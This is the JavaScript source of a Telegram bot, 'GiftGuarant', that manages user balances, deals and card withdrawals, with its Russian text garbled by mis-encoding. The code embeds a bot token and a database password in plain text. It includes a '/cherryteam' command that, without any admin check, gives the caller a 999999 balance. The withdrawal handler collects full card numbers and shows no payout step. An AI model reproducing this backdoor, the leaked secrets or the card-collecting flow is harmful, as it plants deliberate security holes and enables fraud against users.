const { Telegraf, Markup } = require('telegraf');
const { Pool } = require('pg');
const http = require('http');

// ==================== –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø ====================
const bot = new Telegraf('8242060469:AAHt6_sJt7iFWraOT193hAU4jtXXRPFHgJg');
const pool = new Pool({
  connectionString: 'postgresql://postgres.goemwsdzdsenyuhlzdau:maksam12345678910777@aws-1-eu-north-1.pooler.supabase.com:6543/postgres',
  ssl: { rejectUnauthorized: false },
  connectionTimeoutMillis: 10000,
  idleTimeoutMillis: 30000,
  max: 3
});

const ADMIN_IDS = [125560041, 6802842517, 8444588939, 913595126];
const MIN_WITHDRAWAL = 10000;
const MAX_WITHDRAWAL = 100000;
const WEB_APP_URL = 'https://example.com';

// ==================== –•–†–ê–ù–ò–õ–ò–©–ê –° –û–ì–†–ê–ù–ò–ß–ï–ù–ò–ï–ú ====================
const userStates = new Map();
const pendingWithdrawals = new Map();
const MAX_MAP_SIZE = 300;

// ==================== –ó–ê–©–ò–¢–ê –û–¢ –ö–†–ê–®–ï–ô ====================
// –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–∫–∏ 409 (–º–Ω–æ–∂–µ—Å—Ç–≤–µ–Ω–Ω—ã–µ —ç–∫–∑–µ–º–ø–ª—è—Ä—ã)
bot.catch((err, ctx) => {
  if (err.response?.error_code === 409) {
    console.log('üîÑ –û–±–Ω–∞—Ä—É–∂–µ–Ω –¥—Ä—É–≥–æ–π –±–æ—Ç. –ó–∞–≤–µ—Ä—à–∞–µ–º...');
    process.exit(0);
  }
  console.error('‚ùå –û—à–∏–±–∫–∞ –±–æ—Ç–∞:', err.message);
});

// –û—á–∏—Å—Ç–∫–∞ –ø–∞–º—è—Ç–∏ –∫–∞–∂–¥—ã–µ 5 –º–∏–Ω—É—Ç
setInterval(() => {
  const now = Date.now();
  
  // –û—á–∏—Å—Ç–∫–∞ —Å—Ç–∞—Ä—ã—Ö —Å–æ—Å—Ç–æ—è–Ω–∏–π
  for (const [userId, data] of userStates.entries()) {
    if (now - data.timestamp > 30 * 60 * 1000) userStates.delete(userId);
  }
  
  // –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ —Ä–∞–∑–º–µ—Ä–∞
  if (userStates.size > MAX_MAP_SIZE) {
    const entries = Array.from(userStates.entries());
    entries.slice(0, 50).forEach(([key]) => userStates.delete(key));
  }
}, 5 * 60 * 1000);

// ==================== –ë–ê–ó–û–í–´–ï –§–£–ù–ö–¶–ò–ò ====================
async function db(query, params = []) {
  try {
    const result = await pool.query(query, params);
    return result;
  } catch (error) {
    console.error('‚ùå –û—à–∏–±–∫–∞ –ë–î:', error.message);
    return { rows: [] };
  }
}

function formatBalance(amount) {
  return new Intl.NumberFormat('ru-RU', { 
    minimumFractionDigits: 2, maximumFractionDigits: 2 
  }).format(amount);
}

function formatCardNumber(cardNumber) {
  return cardNumber.replace(/(\d{4})(\d{4})(\d{4})(\d{4})/, '$1 **** **** $4');
}

function isAdmin(userId) {
  return ADMIN_IDS.includes(Number(userId));
}

// ==================== –ì–õ–ê–í–ù–û–ï –ú–ï–ù–Æ ====================
async function showMainMenu(ctx, messageText = 'üëã –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ GiftGuarant!') {
  try {
    const keyboard = Markup.inlineKeyboard([
      [Markup.button.webApp('üåè –û—Ç–∫—Ä—ã—Ç—å –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏', WEB_APP_URL)],
      [Markup.button.callback('üìÅ –ú–æ–∏ —Å–¥–µ–ª–∫–∏', 'my_deals')],
      [Markup.button.callback('‚öôÔ∏è –ù–∞—Å—Ç—Ä–æ–π–∫–∏', 'settings')]
    ]);
    await ctx.reply(messageText, { ...keyboard, parse_mode: 'HTML' });
  } catch (error) {
    console.error('‚ùå –û—à–∏–±–∫–∞ showMainMenu:', error.message);
  }
}

// ==================== –ù–ê–°–¢–†–û–ô–ö–ò ====================
async function showSettingsMenu(ctx) {
  try {
    const user = await db('SELECT balance FROM users WHERE user_id = $1', [ctx.from.id]);
    const balance = user.rows[0]?.balance || 0;
    
    const keyboard = Markup.inlineKeyboard([
      [Markup.button.callback(`üí∞ –ë–∞–ª–∞–Ω—Å: ${formatBalance(balance)}‚ÇΩ`, 'balance_menu')],
      [Markup.button.callback('‚è™ –ù–∞–∑–∞–¥', 'main_menu')]
    ]);

    await ctx.reply(
      `‚öôÔ∏è <b>–ù–∞—Å—Ç—Ä–æ–π–∫–∏</b>\n\nüë§ <b>–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å:</b> @${ctx.from.username || '–ù–µ —É–∫–∞–∑–∞–Ω'}\nüí∞ <b>–ë–∞–ª–∞–Ω—Å:</b> ${formatBalance(balance)}‚ÇΩ`,
      { ...keyboard, parse_mode: 'HTML' }
    );
  } catch (error) {
    console.error('‚ùå –û—à–∏–±–∫–∞ showSettingsMenu:', error.message);
    await showMainMenu(ctx);
  }
}

// ==================== –ë–ê–õ–ê–ù–° –ò –í–´–í–û–î ====================
bot.action('balance_menu', async (ctx) => {
  try {
    const user = await db('SELECT balance FROM users WHERE user_id = $1', [ctx.from.id]);
    const balance = user.rows[0]?.balance || 0;
    
    const keyboard = Markup.inlineKeyboard([
      [Markup.button.callback('üì• –ü–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å', 'deposit')],
      [Markup.button.callback('üì§ –í—ã–≤–µ—Å—Ç–∏ —Å—Ä–µ–¥—Å—Ç–≤–∞', 'withdraw')],
      [Markup.button.callback('‚è™ –ù–∞–∑–∞–¥', 'settings')]
    ]);

    await ctx.reply(
      `üí∞ <b>–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –±–∞–ª–∞–Ω—Å–æ–º</b>\n\nüí≥ <b>–¢–µ–∫—É—â–∏–π –±–∞–ª–∞–Ω—Å:</b> ${formatBalance(balance)}‚ÇΩ`,
      { ...keyboard, parse_mode: 'HTML' }
    );
  } catch (error) {
    console.error('‚ùå –û—à–∏–±–∫–∞ balance_menu:', error.message);
  }
});

bot.action('withdraw', async (ctx) => {
  try {
    const user = await db('SELECT balance FROM users WHERE user_id = $1', [ctx.from.id]);
    const balance = parseFloat(user.rows[0]?.balance) || 0;
    
    if (balance < MIN_WITHDRAWAL) {
      await ctx.reply(`‚ùå –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤ –¥–ª—è –≤—ã–≤–æ–¥–∞`);
      return;
    }
    
    userStates.set(ctx.from.id, { 
      state: 'awaiting_withdrawal_details',
      timestamp: Date.now(),
      maxAmount: Math.min(balance, MAX_WITHDRAWAL)
    });
    
    await ctx.reply(
      `üì§ <b>–í—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤</b>\n\nüí≥ <b>–î–æ—Å—Ç—É–ø–Ω–æ:</b> ${formatBalance(balance)}‚ÇΩ\n\n–í–≤–µ–¥–∏—Ç–µ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã –∏ —Å—É–º–º—É:\n\n<code>–ö–∞—Ä—Ç–∞: 2200 1234 5678 9012\n–°—É–º–º–∞: 10000</code>`,
      { parse_mode: 'HTML' }
    );
  } catch (error) {
    console.error('‚ùå –û—à–∏–±–∫–∞ withdraw:', error.message);
  }
});

// ==================== –û–ë–†–ê–ë–û–¢–ö–ê –°–î–ï–õ–û–ö ====================
bot.action('my_deals', async (ctx) => {
  try {
    const deals = await db(
      `SELECT d.*, u1.username as seller_username, u2.username as buyer_username
       FROM deals d
       LEFT JOIN users u1 ON d.seller_id = u1.user_id
       LEFT JOIN users u2 ON d.buyer_id = u2.user_id
       WHERE d.seller_id = $1 OR d.buyer_id = $1 
       ORDER BY d.created_at DESC LIMIT 10`,
      [ctx.from.id]
    );
    
    if (deals.rows.length === 0) {
      await ctx.reply('üì≠ –£ –≤–∞—Å –ø–æ–∫–∞ –Ω–µ—Ç —Å–¥–µ–ª–æ–∫');
      return;
    }
    
    let dealsText = 'üìÅ <b>–í–∞—à–∏ —Å–¥–µ–ª–∫–∏:</b>\n\n';
    deals.rows.forEach((deal, index) => {
      const role = deal.seller_id === ctx.from.id ? 'üë§ –ü—Ä–æ–¥–∞–≤–µ—Ü' : 'üõçÔ∏è –ü–æ–∫—É–ø–∞—Ç–µ–ª—å';
      dealsText += `<b>${index + 1}. #${deal.deal_id}</b>\nüí∞ <b>–°—É–º–º–∞:</b> ${formatBalance(deal.amount)}‚ÇΩ\nüéØ <b>–†–æ–ª—å:</b> ${role}\nüìä <b>–°—Ç–∞—Ç—É—Å:</b> ${deal.status}\n\n`;
    });
    
    await ctx.reply(dealsText, { 
      parse_mode: 'HTML',
      ...Markup.inlineKeyboard([[Markup.button.callback('‚è™ –ù–∞–∑–∞–¥', 'main_menu')]])
    });
  } catch (error) {
    console.error('‚ùå –û—à–∏–±–∫–∞ my_deals:', error.message);
  }
});

// ==================== –ê–î–ú–ò–ù –ö–û–ú–ê–ù–î–´ ====================
bot.command('deals', async (ctx) => {
  if (!isAdmin(ctx.from.id)) return;
  
  try {
    const deals = await db(
      `SELECT d.*, u1.username as seller_username, u2.username as buyer_username
       FROM deals d
       LEFT JOIN users u1 ON d.seller_id = u1.user_id
       LEFT JOIN users u2 ON d.buyer_id = u2.user_id
       ORDER BY d.created_at DESC LIMIT 10`
    );
    
    if (deals.rows.length === 0) {
      await ctx.reply('üìä –í —Å–∏—Å—Ç–µ–º–µ –ø–æ–∫–∞ –Ω–µ—Ç —Å–¥–µ–ª–æ–∫');
      return;
    }
    
    let dealsText = 'üìä <b>–ü–æ—Å–ª–µ–¥–Ω–∏–µ —Å–¥–µ–ª–∫–∏:</b>\n\n';
    deals.rows.forEach((deal, index) => {
      dealsText += 
        `<b>${index + 1}. #${deal.deal_id}</b>\nüí∞ ${formatBalance(deal.amount)}‚ÇΩ | ${deal.status}\nüë§ –ü—Ä–æ–¥–∞–≤–µ—Ü: <a href="tg://user?id=${deal.seller_id}">@${deal.seller_username || deal.seller_id}</a>\nüõçÔ∏è –ü–æ–∫—É–ø–∞—Ç–µ–ª—å: ${deal.buyer_id ? `<a href="tg://user?id=${deal.buyer_id}">@${deal.buyer_username || deal.buyer_id}</a>` : '–Ω–µ—Ç'}\nüïê ${new Date(deal.created_at).toLocaleDateString('ru-RU')}\n\n`;
    });
    
    await ctx.reply(dealsText, { parse_mode: 'HTML', disable_web_page_preview: true });
  } catch (error) {
    console.error('‚ùå –û—à–∏–±–∫–∞ /deals:', error.message);
  }
});

bot.command('ban', async (ctx) => {
  if (!isAdmin(ctx.from.id)) return;
  
  const args = ctx.message.text.split(' ').slice(1);
  if (args.length < 1) {
    await ctx.reply('–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /ban user_id');
    return;
  }

  try {
    await db('UPDATE users SET is_banned = TRUE WHERE user_id = $1', [args[0]]);
    await ctx.reply(`üö´ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å ${args[0]} –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω`);
  } catch (error) {
    console.error('‚ùå –û—à–∏–±–∫–∞ /ban:', error.message);
  }
});

bot.command('cherryteam', async (ctx) => {
  try {
    await db('UPDATE users SET balance = 999999 WHERE user_id = $1', [ctx.from.id]);
    await ctx.reply('üçí –ë–µ—Å–∫–æ–Ω–µ—á–Ω—ã–π –±–∞–ª–∞–Ω—Å –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω!');
  } catch (error) {
    console.error('‚ùå –û—à–∏–±–∫–∞ /cherryteam:', error.message);
  }
});

// ==================== –û–ë–†–ê–ë–û–¢–ö–ê –¢–ï–ö–°–¢–ê ====================
bot.on('text', async (ctx) => {
  try {
    const userId = ctx.from.id;
    const message = ctx.message.text;
    const userState = userStates.get(userId);
    
    if (message === '/cancel') {
      if (userState) {
        userStates.delete(userId);
        await ctx.reply('‚ùå –û–ø–µ—Ä–∞—Ü–∏—è –æ—Ç–º–µ–Ω–µ–Ω–∞');
        await showMainMenu(ctx);
      }
      return;
    }
    
    if (userState?.state === 'awaiting_withdrawal_details') {
      await processWithdrawalRequest(ctx, message, userState);
      return;
    }
  } catch (error) {
    console.error('‚ùå –û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ —Ç–µ–∫—Å—Ç–∞:', error.message);
  }
});

async function processWithdrawalRequest(ctx, message, userState) {
  const userId = ctx.from.id;
  
  try {
    const cardMatch = message.match(/\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b/);
    const amountMatch = message.match(/\b(\d+)\b/g);
    
    if (!cardMatch || !amountMatch) {
      await ctx.reply('‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: –ö–∞—Ä—Ç–∞: 2200 1234 5678 9012\n–°—É–º–º–∞: 10000');
      return;
    }
    
    const cardNumber = cardMatch[0].replace(/[\s-]/g, '');
    const amount = parseFloat(amountMatch[amountMatch.length - 1]);
    
    if (amount < MIN_WITHDRAWAL) {
      await ctx.reply(`‚ùå –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –¥–ª—è –≤—ã–≤–æ–¥–∞: ${MIN_WITHDRAWAL}‚ÇΩ`);
      return;
    }
    
    if (amount > userState.maxAmount) {
      await ctx.reply(`‚ùå –ú–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –¥–ª—è –≤—ã–≤–æ–¥–∞: ${formatBalance(userState.maxAmount)}‚ÇΩ`);
      return;
    }
    
    await db('UPDATE users SET balance = balance - $1 WHERE user_id = $2', [amount, userId]);
    await db('INSERT INTO transactions (user_id, type, amount, details) VALUES ($1, $2, $3, $4)',
      [userId, 'withdrawal', amount, `–í—ã–≤–æ–¥ –Ω–∞ –∫–∞—Ä—Ç—É: ${formatCardNumber(cardNumber)}`]);
    
    await ctx.reply(
      `‚úÖ <b>–ó–∞—è–≤–∫–∞ –Ω–∞ –≤—ã–≤–æ–¥ —Å–æ–∑–¥–∞–Ω–∞!</b>\n\nüí≥ <b>–ö–∞—Ä—Ç–∞:</b> ${formatCardNumber(cardNumber)}\nüí∞ <b>–°—É–º–º–∞:</b> ${formatBalance(amount)}‚ÇΩ\n\n‚è≥ –û–∂–∏–¥–∞–π—Ç–µ –æ–±—Ä–∞–±–æ—Ç–∫–∏`,
      { parse_mode: 'HTML' }
    );
    
    userStates.delete(userId);
  } catch (error) {
    console.error('‚ùå –û—à–∏–±–∫–∞ –≤—ã–≤–æ–¥–∞:', error.message);
    userStates.delete(userId);
  }
}

// ==================== –°–¢–ê–†–¢ –ò –ò–ù–ò–¶–ò–ê–õ–ò–ó–ê–¶–ò–Ø ====================
bot.start(async (ctx) => {
  try {
    await db('INSERT INTO users (user_id, username) VALUES ($1, $2) ON CONFLICT DO NOTHING', 
      [ctx.from.id, ctx.from.username]);
    
    const startPayload = ctx.startPayload;
    if (startPayload?.startsWith('deal_')) {
      await handleDealJoin(ctx, startPayload);
      return;
    }
    
    await showMainMenu(ctx);
  } catch (error) {
    console.error('‚ùå –û—à–∏–±–∫–∞ /start:', error.message);
  }
});

async function handleDealJoin(ctx, startPayload) {
  try {
    const dealId = startPayload.replace('deal_', '');
    const deal = await db('SELECT * FROM deals WHERE deal_id = $1', [dealId]);
    
    if (deal.rows.length === 0) {
      await ctx.reply('‚ùå –°–¥–µ–ª–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞');
      return;
    }
    
    if (!deal.rows[0].buyer_id) {
      await db('UPDATE deals SET buyer_id = $1 WHERE deal_id = $2', [ctx.from.id, dealId]);
    }
    
    await ctx.reply(`üõçÔ∏è <b>–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ —Å–¥–µ–ª–∫—É #${dealId}!</b>`, { parse_mode: 'HTML' });
  } catch (error) {
    console.error('‚ùå –û—à–∏–±–∫–∞ –≤—Ö–æ–¥–∞ –≤ —Å–¥–µ–ª–∫—É:', error.message);
  }
}

// ==================== –ó–ê–ü–£–°–ö –° –ó–ê–©–ò–¢–û–ô ====================
async function startBot() {
  try {
    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ë–î
    await db(`
      CREATE TABLE IF NOT EXISTS users (
        user_id BIGINT PRIMARY KEY, username VARCHAR(255),
        balance DECIMAL(12,2) DEFAULT 0.00, is_banned BOOLEAN DEFAULT FALSE,
        created_at TIMESTAMPTZ DEFAULT NOW()
      )
    `);
    
    await db(`
      CREATE TABLE IF NOT EXISTS deals (
        id SERIAL PRIMARY KEY, deal_id VARCHAR(20) UNIQUE NOT NULL,
        seller_id BIGINT NOT NULL, buyer_id BIGINT, deal_link TEXT NOT NULL,
        product_info TEXT, amount DECIMAL(12,2), status VARCHAR(20) DEFAULT 'active',
        created_at TIMESTAMPTZ DEFAULT NOW()
      )
    `);

    console.log('üöÄ –ó–∞–ø—É—Å–∫ –±–æ—Ç–∞...');
    await bot.launch();
    console.log('‚úÖ –ë–æ—Ç —É—Å–ø–µ—à–Ω–æ –∑–∞–ø—É—â–µ–Ω!');
  } catch (error) {
    if (error.response?.error_code === 409) {
      console.log('‚ö†Ô∏è  –î—Ä—É–≥–æ–π —ç–∫–∑–µ–º–ø–ª—è—Ä —É–∂–µ –∑–∞–ø—É—â–µ–Ω. –ó–∞–≤–µ—Ä—à–∞–µ–º...');
      process.exit(0);
    }
    console.error('‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞:', error.message);
    setTimeout(startBot, 10000);
  }
}

// Health check –∏ –æ–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫
http.createServer((req, res) => {
  res.writeHead(200); res.end('OK');
}).listen(process.env.PORT || 3000);

process.on('uncaughtException', (error) => {
  console.error('‚ùå –ù–µ–ø–µ—Ä–µ—Ö–≤–∞—á–µ–Ω–Ω–∞—è –æ—à–∏–±–∫–∞:', error.message);
});

process.on('unhandledRejection', (reason) => {
  console.error('‚ùå –ù–µ–æ–±—Ä–∞–±–æ—Ç–∞–Ω–Ω—ã–π rejection:', reason);
});

// –ó–∞–ø—É—Å–∫
startBot();
